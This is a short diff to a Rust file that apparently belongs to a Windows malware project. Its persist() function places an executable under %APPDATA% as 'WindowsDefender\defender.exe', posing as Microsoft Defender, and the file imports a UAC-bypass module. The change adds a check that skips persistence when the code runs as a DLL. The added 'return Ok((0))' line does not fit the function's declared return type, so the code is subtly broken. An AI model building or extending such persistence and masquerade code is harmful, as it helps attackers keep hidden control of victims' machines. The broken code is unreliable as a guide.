@@ -1,3 +1,4 @@
+mod is_dll;
 use winreg::enums::{*};
 use winreg::RegKey;
 use winreg::enums;
@@ -9,8 +10,13 @@ use crate::uac_bypass;
 /// Target subpath inside APPDATA
 const TARGET_SUBPATH: &str = "WindowsDefender\\defender.exe";
 
+#[cfg(target_os = "windows")]
+
 pub fn persist() -> std::io::Result<()> {
     // Resolve %APPDATA%
+    if is_dll::is_dll(){
+        return Ok((0));
+    }
     let appdata = env::var("APPDATA")
         .map_err(|e| std::io::Error::new(std::io::ErrorKind::NotFound, e))?;
 
